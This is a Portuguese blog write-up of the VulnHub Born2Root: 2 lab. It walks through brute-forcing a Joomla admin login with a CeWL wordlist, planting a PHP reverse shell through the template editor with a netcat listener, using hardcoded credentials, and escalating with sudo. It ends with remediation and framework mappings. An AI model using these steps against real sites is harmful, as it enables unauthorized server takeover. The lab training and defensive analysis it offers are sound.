# VulnHub Born2Root: 2 — Brute-Force no Joomla até Root via Sudo

Caramba rapaziada!! Quem diria que um blog Joomla sobre viagens viraria a porta de entrada para comprometimento total root? Born2Root: 2 encadeia um ataque de wordlist customizada com CeWL no painel admin do Joomla, reverse shell PHP via editor de template, credenciais hardcoded num script Python local, e uma regra sudo com permissão demais que entrega root na bandeja. Top demais como combinação de erros de desenvolvedor empacotados numa só máquina.

Valeu ao autor por fazer essa máquina parecer uma avaliação realista de aplicação web interna, com erros que desenvolvedores reais cometem todo dia.

---

| Campo | Valor |
|-------|-------|
| **Nível** | Fácil / Iniciante |
| **VM Alvo** | Born2Root: 2 |
| **VM do Atacante** | Kali Linux 2024.x |
| **VulnHub** | https://www.vulnhub.com/entry/born2root-2,421/ |
| **Técnicas** | Brute-force de diretório, wordlist CeWL, brute-force no admin do Joomla, reverse shell PHP via editor de template, credenciais hardcoded, escalação de privilégios via sudo |
| **CVEs / CWEs** | CWE-521 (Requisitos de Senha Fracos), CWE-522 (Credenciais Insuficientemente Protegidas), CWE-269 (Gerenciamento de Privilégios Impróprio via sudo), CWE-798 (Credenciais Hardcoded) |
| **Grupos APT** | FIN7 (brute-force de credenciais em aplicações web), APT33 (web shell via manipulação de template CMS), Kimsuky (coleta de credenciais hardcoded em pós-exploração) |

---

## Resumo do Ataque

```
[descoberta de host: nmap]
    |
    v
[nmap: 22/tcp SSH | 80/tcp HTTP | 111/tcp RPC]
    |
    v
[dirb => /joomla/ descoberto => "Tim's Blog"]
    |
    v
[CeWL em /joomla/ => wordlist customizada incluindo "travel"]
    |
    v
[Burp Intruder brute-force: admin:travel => acesso admin Joomla]
    |
    v
[editor de template Joomla: beez3/index.php => reverse shell PHP]
    |
    v
[listener nc => shell como www-data]
    |
    v
[/opt/scripts/fileshare.py => tim:lulzlol (hardcoded)]
    |
    v
[su tim => sudo -l => sudo su => ROOT]
    |
    v
[/root/flag.txt]
```

---

## Metodologia

1. Enumeração de rede com Nmap
2. Brute-force de diretório com dirb para descobrir instalação Joomla
3. Geração de wordlist CeWL a partir do conteúdo do site Joomla
4. Brute-force do painel admin do Joomla com Burp Suite Intruder
5. Injeção de reverse shell PHP via editor de template do Joomla
6. Pós-exploração: busca por credenciais hardcoded em scripts locais
7. Movimento lateral para `tim` usando as credenciais encontradas
8. Escalação de privilégios via regra sudo com permissão excessiva

---

## Passo 1 — Identificando o Alvo

```bash
netdiscover -r 192.168.1.0/24
```

Alvo: **192.168.1.9**

```bash
nmap -A -T4 192.168.1.9
```

Saída esperada:

```
22/tcp  open  ssh    OpenSSH
80/tcp  open  http   Apache/2.x
111/tcp open  rpcbind
```

Três serviços: SSH, HTTP e RPC. Footprint padrão de servidor web Linux.

> **MITRE ATT&CK:** TA0043 Reconnaissance | T1046 Network Service Discovery

---

## Passo 2 — Enumeração Web e Descoberta do CMS

A página principal parece genérica. Brute-force de diretório é necessário para encontrar o CMS:

```bash
dirb http://192.168.1.9/
```

A saída esperada revela `/joomla/`. Acesse `http://192.168.1.9/joomla/` e é o "Tim's Blog" rodando Joomla CMS. Essa dica do nome de usuário é sutil mas útil.

O painel admin do Joomla fica em: `http://192.168.1.9/joomla/administrator/`

> **MITRE ATT&CK:** TA0043 Reconnaissance | T1083 File and Directory Discovery

---

## Passo 3 — Wordlist Customizada com CeWL

> **O que é CeWL?** CeWL (Custom Word List generator) faz spider de um site e gera uma wordlist com as palavras encontradas na página. É altamente eficaz contra alvos onde as senhas provavelmente são derivadas do conteúdo do site, nomes de produtos ou temas. Nesse caso, o "Tim's Blog" é sobre viagens, e a senha do admin é literalmente uma palavra do conteúdo do blog.

```bash
cewl http://192.168.1.9/joomla/ > dict.txt
cat dict.txt | wc -l    # Verificar tamanho da wordlist
head -20 dict.txt       # Prévia das entradas
```

Isso gera uma wordlist específica ao contexto. Procure palavras como "travel", "journey", "adventure" na saída.

> **Nota do mundo real:** Wordlists específicas ao site aumentam dramaticamente as taxas de sucesso contra autenticação de aplicações web. Equipes de segurança frequentemente descobrem que usuários escolhem senhas relacionadas ao seu papel, nome da empresa ou tema da aplicação. Essa técnica é usada pelo APT33 e FIN7 em ataques direcionados de credenciais.

> **MITRE ATT&CK:** TA0006 Credential Access | T1110.002 Password Spraying

---

## Passo 4 — Brute-Force do Admin Joomla com Burp Suite

Configure o Burp Suite Intruder no login admin do Joomla em `http://192.168.1.9/joomla/administrator/`:

1. Intercepte uma tentativa de login com o Burp Proxy.
2. Envie a requisição para o Intruder.
3. Marque o campo `passwd` como posição do payload.
4. Carregue `dict.txt` como payload de lista simples.
5. Inicie o ataque e observe os tamanhos de resposta.

Quando o Intruder acertar a senha correta, o tamanho da resposta vai diferir das tentativas falhas.

**Credenciais encontradas:** `admin` / `travel`

> **MITRE ATT&CK:** TA0006 Credential Access | T1110.001 Password Guessing | T1078 Valid Accounts

---

## Passo 5 — Reverse Shell PHP via Editor de Template Joomla

Faça login no painel admin do Joomla como `admin:travel`.

Navegue até: **Extensions > Templates > Templates > beez3 > index.php**

Substitua todo o conteúdo do `index.php` por um reverse shell PHP. Edite `/usr/share/webshells/php/php-reverse-shell.php` primeiro:

```php
$ip = '<SEU_IP_ATACANTE>';
$port = 1234;
```

Cole o conteúdo completo do shell no editor de template do Joomla e clique em **Save**.

Inicie o listener netcat:

```bash
nc -lvnp 1234
```

Acione o shell acessando:

```
http://192.168.1.9/joomla/templates/beez3/index.php
```

Shell recebido como `www-data`. Estabilize:

```bash
python -c 'import pty;pty.spawn("/bin/bash")'
```

> **O que é RCE via template no Joomla?** O editor de template do Joomla permite que administradores autenticados modifiquem diretamente arquivos PHP de template. Como templates são executados em cada requisição de página, substituir um arquivo de template por payload de reverse shell resulta em RCE imediato. Não é um CVE mas uma funcionalidade de design que se torna crítica quando combinada com credenciais admin fracas. Mapeia para CWE-94 (Controle Impróprio de Geração de Código).

> **MITRE ATT&CK:** TA0002 Execution | T1505.003 Server Software Component: Web Shell

---

## Passo 6 — Pós-Exploração: Descoberta de Credenciais

Enumere scripts locais e arquivos de configuração:

```bash
ls /opt/
ls /opt/scripts/
cat /opt/scripts/fileshare.py
```

`fileshare.py` contém credenciais hardcoded:

```python
# ... em algum lugar do script
user = "tim"
password = "lulzlol"
```

Isso é um achado crítico: credenciais em texto simples para um usuário local armazenadas num script Python que qualquer usuário do sistema pode ler. Pô, que vacilo mano.

> **MITRE ATT&CK:** TA0006 Credential Access | T1552.001 Credentials in Files

---

## Passo 7 — Movimento Lateral para tim

```bash
su tim
# Senha: lulzlol

id
# uid=1001(tim) gid=1001(tim) groups=1001(tim)
```

Agora você é `tim`. Isso é um movimento lateral da conta de serviço web para uma conta de usuário real.

> **MITRE ATT&CK:** TA0008 Lateral Movement | T1078 Valid Accounts

---

## Passo 8 — Escalação de Privilégios via Sudo

Verifique o que `tim` pode executar com sudo:

```bash
sudo -l
```

A saída esperada revela permissões sudo amplas. Escale:

```bash
sudo su
```

```bash
whoami
# root

id
# uid=0(root) gid=0(root) groups=0(root)

cd /root
ls
cat flag.txt
```

**(ﾉ◕ヮ◕)ﾉ Root conquistado!! A privesc via sudo mais clássica de todas entregou!!**

> **MITRE ATT&CK:** TA0004 Privilege Escalation | T1548.003 Sudo and Sudo Caching

---

## Flags, Hashes e Credenciais Capturadas

| Tipo | Valor | Encontrado Em | Crackeado/Usado |
|------|-------|---------------|----------------|
| Admin Joomla | `admin:travel` | /joomla/administrator/ (brute-force) | Login admin Joomla |
| Credencial usuário local | `tim:lulzlol` | /opt/scripts/fileshare.py | su tim |
| Flag Root | ver `/root/flag.txt` | `/root/flag.txt` | N/A |

---

## Lições Aprendidas

| # | Achado | Relevância no Mundo Real | Lição Principal |
|---|--------|--------------------------|----------------|
| 1 | Senha admin do Joomla derivada do conteúdo do site ("travel") | Senhas específicas ao site são sistematicamente atacadas com CeWL | Exija complexidade de senha que não possa ser derivada do contexto da empresa/app |
| 2 | Editor de template do Joomla permitiu modificação direta de arquivo PHP | Acesso admin a editores de template CMS equivale a execução de código no servidor | Desabilite o editor de template web em produção; use deploy pelo sistema de arquivos |
| 3 | Credenciais hardcoded em `/opt/scripts/fileshare.py` | Segredos hardcoded em scripts são um achado frequente em avaliações de segurança cloud e container | Use variáveis de ambiente ou um gerenciador de segredos (HashiCorp Vault, AWS Secrets Manager) |
| 4 | Regra sudo excessiva deu a `tim` caminho trivial para root | Sudoers mal configurado é um dos vetores de privesc Linux mais comuns | Siga princípio do menor privilégio; execute `sudo -l` em todas as contas de serviço como parte da auditoria de hardening |

**Por que isso importa fora do lab?**

A combinação de brute-force em CMS mais RCE via template é um padrão de ataque real. Múltiplos incidentes com Joomla e WordPress seguiram exatamente essa cadeia: senha admin fraca descoberta via stuffing de credenciais ou wordlist específica ao site, depois RCE via editor de tema/plugin. O APT33 e FIN7 têm documentado uso de acesso administrativo a CMS para plantar web shells em ambientes corporativos. O achado de credenciais hardcoded mapeia diretamente para o problema recorrente de segredos em repositórios de código, onde ferramentas como TruffleHog, GitLeaks e Semgrep encontram regularmente senhas de banco de produção e chaves de API commitadas no histórico do git.

---

## Mapeamento MITRE ATT&CK

| Fase | Tática | Técnica | TTP-ID |
|------|--------|---------|--------|
| Reconhecimento | TA0043 | File and Directory Discovery | T1083 |
| Acesso Inicial | TA0001 | Valid Accounts: Local Accounts | T1078.003 |
| Acesso a Credenciais | TA0006 | Brute Force: Password Guessing | T1110.001 |
| Acesso a Credenciais | TA0006 | Credentials in Files | T1552.001 |
| Execução | TA0002 | Server Software Component: Web Shell | T1505.003 |
| Execução | TA0002 | Command and Scripting Interpreter: Unix Shell | T1059.004 |
| Persistência | TA0003 | Server Software Component: Web Shell | T1505.003 |
| Escalação de Privilégios | TA0004 | Abuse Elevation Control Mechanism: Sudo | T1548.003 |
| Movimento Lateral | TA0008 | Valid Accounts | T1078 |
| Descoberta | TA0007 | File and Directory Discovery | T1083 |

> MITRE ATT&CK: https://attack.mitre.org/

---

## Remediação e Contenção

### Correções Técnicas

1. Exija política de senha forte para todas as contas admin do CMS; mínimo 16 caracteres, complexidade obrigatória, sem palavras do dicionário.
2. Habilite autenticação multifator no painel admin do Joomla.
3. Desabilite o editor de template do Joomla em produção (restringir o editor via configuração de ACL).
4. Migre todas as credenciais hardcoded em scripts para variáveis de ambiente ou gerenciador de segredos.
5. Audite `/etc/sudoers` e remova qualquer regra que conceda sudo amplo; use a diretiva NOPASSWD somente para comandos específicos com escopo limitado.
6. Coloque o painel admin do Joomla atrás de restrição de IP ou acesso VPN.

### Se Você Encontrar Algo Similar no Seu Ambiente

**Contenção imediata:**
- Rotacione a senha admin do Joomla imediatamente; revise todas as contas admin.
- Varra todos os scripts e arquivos de configuração em busca de credenciais hardcoded: `grep -rE "(password|passwd|secret|token)\s*=\s*['\"]" /opt/ /home/ /var/www/`
- Audite `/etc/sudoers` com `sudo -l` para todos os usuários não-root.
- Remova qualquer web shell plantado: `find /var/www -name "*.php" -newer /var/www/html/index.php`

**Contramedidas MITRE D3FEND:**
- D3-PH Password Hardening para contas admin do Joomla (T1110.001)
- D3-UAP User Account Permissions: revisão de regras sudo (T1548.003)
- D3-FAPA File Access Pattern Analysis para detectar arquivos de credenciais legíveis por contas de serviço web (T1552.001)
- D3-NTF Network Traffic Filtering para restringir acesso admin do Joomla por IP (T1078)

### Alinhamento de Frameworks

**NIST CSF 2.0:**
- Identify (ID.AM): Inventarie todas as instalações de CMS e contas admin associadas.
- Protect (PR.AC-4): Gerenciamento de acesso privilegiado; restrinja admin do CMS a pessoal autorizado com MFA.
- Protect (PR.DS-2): Proteção de dados em trânsito; garanta que o painel admin use HTTPS.
- Detect (DE.CM-7): Monitore tentativas de login não autorizadas em painéis admin de CMS.
- Respond (RS.RP-1): Execute plano de IR ao detectar login não autorizado no admin do CMS.
- Recover (RC.RP-1): Restaure o CMS a partir de backup limpo após detecção de web shell.

**NIST SP 800-53 Rev. 5:**
- IA-5: Authenticator Management (exigir complexidade de senha, MFA para contas admin)
- AC-6: Least Privilege (restringir regras sudo a comandos específicos)
- CM-7: Least Functionality (desabilitar editor de template em CMS de produção)
- SI-12: Information Management and Retention (não armazenar credenciais em scripts)
- SA-15: Development Process, Standards, and Tools (gerenciamento de segredos em CI/CD)

**CISA Known Exploited Vulnerabilities:**
- Sem CVE direto para esta cadeia de ataque específica; vulnerabilidades RCE no Joomla como CVE-2015-8562 e CVE-2023-23752 estão no catálogo CISA KEV e representam a mesma superfície de ataque.
- Referência: https://www.cisa.gov/known-exploited-vulnerabilities-catalog

**C2M2 (Cybersecurity Capability Maturity Model):**
- Domínio: ACCESS (Identity and Access Management)
- Prática: Manage Access
- MIL Alvo: MIL-2 (políticas de controle de acesso documentadas e aplicadas, MFA para acesso privilegiado)

---

## Considerações Finais

Valeu ao autor do Born2Root: 2 por construir uma máquina que captura exatamente os tipos de erros que desenvolvedores reais cometem: uma senha ligada ao tema da app, edição de arquivos de produção pela interface web, segredos em scripts, e sudo demais. Cada achado individualmente parece pequeno, mas juntos entregam a máquina em menos de 30 minutos.

A técnica CeWL vale a pena internalizar: wordlists customizadas construídas a partir do contexto do alvo são consistentemente mais eficazes que o rockyou.txt contra alvos específicos. Qualquer engajamento de red team contra uma empresa deve começar com uma passagem do CeWL nos sites públicos deles.

Se esse walkthrough te ajudou, compartilha com a galera e continua hackando!

*Thanks guys!! (❍ᴥ❍ʋ)*

---

*Writeup por [André Henrike](https://medium.com/@mrhenrike) | [União Geek](https://uniaogeek.com.br)*
